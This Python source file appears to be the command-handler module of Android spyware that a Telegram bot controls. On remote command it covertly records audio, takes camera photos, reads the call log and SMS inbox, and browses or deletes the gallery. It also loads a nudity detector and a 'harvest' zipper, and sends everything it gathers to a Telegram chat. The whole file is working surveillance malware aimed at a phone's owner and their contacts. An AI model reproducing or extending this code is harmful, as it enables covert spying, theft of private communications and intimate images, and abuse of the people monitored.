# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import sys
import gc
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
PENDING_DIR = os.path.join(P, "pending_upload")
TEMP_DIR = os.path.join(P, "ctmp")
for d in [PENDING_DIR, TEMP_DIR]:
    if not os.path.exists(d):
        os.makedirs(d)

# إضافة المسار إلى sys.path لضمان استيراد الملفات المحملة
if P not in sys.path:
    sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== استيراد SecurityException بشكل صحيح ==========
try:
    from android.permissions import SecurityException
except ImportError:
    SecurityException = Exception


class C:
    def __init__(self):
        self.mic_busy = False
        self._mic_lock = threading.Lock()      # قفل لحماية حالة الميكروفون
        self._component_lock = threading.Lock() # قفل لتحميل المكونات
        self._components_loaded = False        # علامة لتجنب إعادة التحميل المتكرر
        self._cleanup()

    # ========== تنظيف الملفات القديمة ==========
    def _cleanup(self):
        try:
            now = time.time()
            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
                if not os.path.exists(folder):
                    continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    try:
                        if os.path.getmtime(path) < now - max_age:
                            os.remove(path)
                    except:
                        pass
        except:
            pass

    # ========== التحقق من الصلاحيات ==========
    def _check_permissions(self, permissions):
        """التحقق من وجود الصلاحيات المطلوبة"""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission
            return all(check_permission(p) for p in permissions)
        except:
            return True

    # ========== تحميل المكونات (محسّن) ==========
    def _ensure_components(self, m):
        """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
        if self._components_loaded:
            return
            
        with self._component_lock:
            if self._components_loaded:
                return
                
            try:
                # التحقق من وجود السمات الأساسية
                if not hasattr(m, 'ui') or m.ui is None:
                    logging.error("UI component not available")
                    return

                # تعريف المكونات المطلوبة
                components = [
                    ('nude_detector', 'nude_detector', 'NudeDetector',
                     lambda: {'mon': m}),
                    ('media_scanner', 'media_scanner', 'MediaScanner',
                     lambda: {'det': m.nude_detector, 'ui': m.ui}),
                    ('gallery_browser', 'gallery_browser', 'G',
                     lambda: {'sc': m.media_scanner, 'tg': m.ui}),
                    ('camera_analyzer', 'camera_analyzer', 'CameraAnalyzer',
                     lambda: {'mon': m, 'det': m.nude_detector}),
                    ('daily_zipper', 'daily_zipper', 'DailyZipper',
                     lambda: {'scanner': m.media_scanner, 'tg': m.ui})
                ]

                for attr, module_name, class_name, args_fn in components:
                    if not hasattr(m, attr) or getattr(m, attr) is None:
                        try:
                            module = __import__(module_name)
                            cls = getattr(module, class_name)
                            args = args_fn()
                            
                            # استدعاء مختلف حسب نوع المكون
                            if attr == 'nude_detector':
                                setattr(m, attr, cls(args['mon']))
                            else:
                                setattr(m, attr, cls(**args))
                                
                            logging.info(f"✅ {class_name} loaded")
                            
                        except ImportError as e:
                            logging.error(f"Import error for {module_name}: {e}")
                        except Exception as e:
                            logging.error(f"Init error for {class_name}: {e}")

                self._components_loaded = True
                
            except Exception as e:
                logging.error(f"Component init error: {e}")

    # ========== إرسال ملف نصي ==========
    def _send_text_file(self, tg, chat_id, content, filename):
        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
        try:
            if not content or not content.strip():
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: لا يوجد محتوى"})
                return

            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)

            if os.path.getsize(temp_path) == 0:
                os.remove(temp_path)
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: ملف فارغ"})
                return

            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument",
                               {"chat_id": chat_id, "caption": f"📄 {filename}"},
                               {"document": f})
            if resp and resp.get('ok'):
                os.remove(temp_path)
            else:
                logging.warning(f"File {filename} left in pending")

        except Exception as e:
            logging.error(f"_send_text_file error: {e}")
            # محاولة إرسال كنص إذا فشل إرسال الملف
            try:
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
            except:
                pass
            finally:
                if os.path.exists(temp_path):
                    try:
                        os.remove(temp_path)
                    except:
                        pass

    # ========== تسجيل صوتي ==========
    def _record_audio(self, duration=10):
        if not JNI:
            return None

        with self._mic_lock:
            if self.mic_busy:
                return None
            self.mic_busy = True

        media_recorder = None
        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")

        try:
            # التحقق من صلاحية التسجيل
            if not self._check_permissions(['android.permission.RECORD_AUDIO']):
                logging.error("RECORD_AUDIO permission not granted")
                return None

            MR = autoclass('android.media.MediaRecorder')
            media_recorder = MR()
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare()
            media_recorder.start()

            # تسجيل لمدة محددة مع إمكانية المقاطعة
            for _ in range(duration):
                time.sleep(1)

            media_recorder.stop()
            media_recorder.reset()

            if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
                return out_path
            return None

        except Exception as e:
            logging.error(f"Recording error: {e}")
            return None
        finally:
            if media_recorder:
                try:
                    media_recorder.release()
                except:
                    pass
            with self._mic_lock:
                self.mic_busy = False

    # ========== جلب سجل المكالمات ==========
    def _call_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"

        if not self._check_permissions(['android.permission.READ_CALL_LOG']):
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"

        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد مكالمات"

            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            idx_type = cursor.getColumnIndex("type")
            idx_date = cursor.getColumnIndex("date")

            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                call_type = cursor.getString(idx_type) or "?"
                date = cursor.getString(idx_date) or "0"

                type_str = {"1": "📥 وارد", "2": "📤 صادر", "3": "❌ فائت"}.get(call_type, "❓")
                try:
                    date_str = datetime.fromtimestamp(int(date) / 1000).strftime("%Y-%m-%d %H:%M")
                except:
                    date_str = "?"

                lines.append(f"{type_str} {name} ({num}) [{date_str}]")

            return "\n".join(lines) if lines else "سجل المكالمات فارغ"

        except SecurityException:
            logging.error("Call log: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "خطأ في قراءة المكالمات"
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass

    # ========== جلب رسائل SMS ==========
    def _sms_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"

        if not self._check_permissions(['android.permission.READ_SMS']):
            return "⚠️ لا توجد صلاحية لقراءة الرسائل"

        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد رسائل"

            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            idx_date = cursor.getColumnIndex("date")

            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                date = cursor.getString(idx_date) or "0"

                try:
                    date_str = datetime.fromtimestamp(int(date) / 1000).strftime("%Y-%m-%d %H:%M")
                except:
                    date_str = "?"

                lines.append(f"📩 من: {addr}\n🕐 {date_str}\n💬 {body}\n---")

            return "\n".join(lines) if lines else "صندوق الوارد فارغ"

        except SecurityException:
            logging.error("SMS: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة الرسائل"
        except Exception as e:
            logging.error(f"SMS error: {e}")
            return "خطأ في قراءة الرسائل"
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass

    # ========== التحقق من البطارية ==========
    def _battery_ok(self, m):
        try:
            if hasattr(m, '_battery_ok') and callable(m._battery_ok):
                b, ch = m._battery_ok()
                return b >= 15 or ch
        except Exception as e:
            logging.error(f"Battery check error: {e}")
        return True

    # ========== نقطة الدخول الرئيسية ==========
    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    # ========== معالج الأوامر الأساسي (مقسم) ==========
    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            if not cmd or not isinstance(cmd, str):
                return

            # تأكيد استلام callback
            if cbq:
                try:
                    tg._api("answerCallbackQuery", {"callback_query_id": cbq})
                except:
                    pass

            # تحميل المكونات
            self._ensure_components(m)

            # توزيع الأوامر على معالجات منفصلة
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
                self._handle_gallery(cmd, tg, m, cid)
            elif cmd.startswith(("cam_", "camf_")):
                self._handle_camera(cmd, tg, m, cid)
            elif cmd.startswith("mic_"):
                self._handle_mic(tg, m, cid)
            elif cmd.startswith("callog_"):
                self._handle_callog(tg, cid)
            elif cmd.startswith("sms_"):
                self._handle_sms(tg, cid)
            elif cmd.startswith("hrv_"):
                self._handle_harvest(tg, m, cid)
            elif cmd.startswith("send_now_"):
                self._handle_send_now(tg, m, cid)
            elif cmd.startswith("media_"):
                self._handle_media(tg, m, cid)
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})

        except Exception as e:
            logging.error(f"Command handler error: {e}")
            try:
                tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
            except:
                pass
        finally:
            try:
                gc.collect()
            except:
                pass

    # ========== معالج أوامر المعرض ==========
    def _handle_gallery(self, cmd, tg, m, cid):
        try:
            parts = cmd.split("|")
            if len(parts) < 2:
                return

            action = parts[0]

            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return

            if action == "g_nav" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                tg._api("editMessageReplyMarkup",
                        {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})

            elif action == "g_opt" and len(parts) >= 4:
                m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])

            elif action == "g_act" and len(parts) >= 5:
                m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])

            elif action == "g_conf" and len(parts) >= 5:
                act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                               {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                tg._api("sendMessage",
                       {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟",
                        "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})

            elif action == "g_bulk" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                m.gallery_browser.execute_action(cid, "bulk", cat, page)

        except Exception as e:
            logging.error(f"Gallery handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في معالج المعرض"})

    # ========== معالج أوامر الكاميرا ==========
    def _handle_camera(self, cmd, tg, m, cid):
        try:
            is_front = 1 if "camf_" in cmd else 0

            if not self._battery_ok(m):
                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً"})
                return

            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ الكاميرا غير متاحة"})
                return

            tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})

            def capture_and_analyze():
                try:
                    m.camera_analyzer.harvest(cam_id=is_front)
                except Exception as e:
                    logging.error(f"Camera harvest error: {e}")

            threading.Thread(target=capture_and_analyze, daemon=True).start()
            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها."})

        except Exception as e:
            logging.error(f"Camera handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الكاميرا"})

    # ========== معالج أوامر الميكروفون ==========
    def _handle_mic(self, tg, m, cid):
        try:
            if self.mic_busy:
                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                return

            tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})

            def record_and_send():
                audio_path = self._record_audio(10)
                if audio_path and os.path.exists(audio_path):
                    try:
                        target = getattr(m, 'vlt', cid)
                        with open(audio_path, 'rb') as f:
                            tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                    except Exception as e:
                        logging.error(f"Send voice error: {e}")
                    finally:
                        try:
                            os.remove(audio_path)
                        except:
                            pass
                else:
                    try:
                        tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                    except:
                        pass

            threading.Thread(target=record_and_send, daemon=True).start()

        except Exception as e:
            logging.error(f"Mic handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الميكروفون"})

    # ========== معالج سجل المكالمات ==========
    def _handle_callog(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._call_log()
            self._send_text_file(tg, cid, data, "calls.txt")
        except Exception as e:
            logging.error(f"Callog handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب سجل المكالمات"})

    # ========== معالج رسائل SMS ==========
    def _handle_sms(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._sms_log()
            self._send_text_file(tg, cid, data, "sms.txt")
        except Exception as e:
            logging.error(f"SMS handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب الرسائل"})

    # ========== معالج الحصاد ==========
    def _handle_harvest(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})

                def run_harvest():
                    try:
                        m.daily_zipper.run()
                    except Exception as e:
                        logging.error(f"Harvest error: {e}")

                threading.Thread(target=run_harvest, daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
        except Exception as e:
            logging.error(f"Harvest handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الحصاد"})

    # ========== معالج الإرسال الفوري ==========
    def _handle_send_now(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})

                def send_now():
                    try:
                        m.daily_zipper.force_send_now(cid)
                    except Exception as e:
                        logging.error(f"Force send error: {e}")

                threading.Thread(target=send_now, daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
        except Exception as e:
            logging.error(f"Send now handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الإرسال الفوري"})

    # ========== معالج فتح المعرض ==========
    def _handle_media(self, tg, m, cid):
        try:
            if hasattr(m, 'gallery_browser') and m.gallery_browser:
                kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                res = tg._api("sendMessage",
                             {"chat_id": cid, "text": "🖼️ معرض الوسائط",
                              "reply_markup": json.dumps(kb)})
                if res and res.get('ok'):
                    m.last_mid = res['result']['message_id']
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
        except Exception as e:
            logging.error(f"Media handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في فتح المعرض"})


# ========== دالة الإرسال الفوري الخارجية ==========
def force_send_zip(m, device_id, tg, chat_id):
    """إرسال الملف المضغوط فوراً"""
    try:
        if hasattr(m, 'daily_zipper') and m.daily_zipper:
            threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
        else:
            tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
    except Exception as e:
        logging.error(f"force_send_zip error: {e}")


# ========== الواجهة الخارجية الرئيسية ==========
_handler = None
_handler_lock = threading.Lock()


def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    with _handler_lock:
        if _handler is None:
            _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
